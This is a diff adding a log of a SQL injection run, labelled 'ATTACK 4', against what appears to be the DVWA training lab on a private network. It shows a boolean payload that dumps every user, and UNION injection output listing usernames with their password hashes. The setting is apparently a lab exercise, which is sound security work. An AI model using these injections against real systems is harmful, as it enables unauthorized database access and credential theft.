@@ -1,0 +1,22 @@
+=== [ATTACK 4] SQL Injection against http://192.168.20.10/vulnerabilities/sqli/ ===
+1. Logged in as admin (security level: low)
+
+2. Baseline query, id=1 (expect one row, admin)
+First name: admin<br />Surname: admin
+
+3. Boolean injection: id=1' OR '1'='1 (expect every user)
+First name: admin<br />Surname: admin
+First name: Gordon<br />Surname: Brown
+First name: Hack<br />Surname: Me
+First name: Pablo<br />Surname: Picasso
+First name: Bob<br />Surname: Smith
+
+4. UNION injection: pulls usernames and password hashes from the users table
+First name: admin<br />Surname: admin
+First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03
+First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+First name: pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+First name: smithy<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+=== SQL injection attempt completed. Evidence in /tmp/sqli-evidence ===
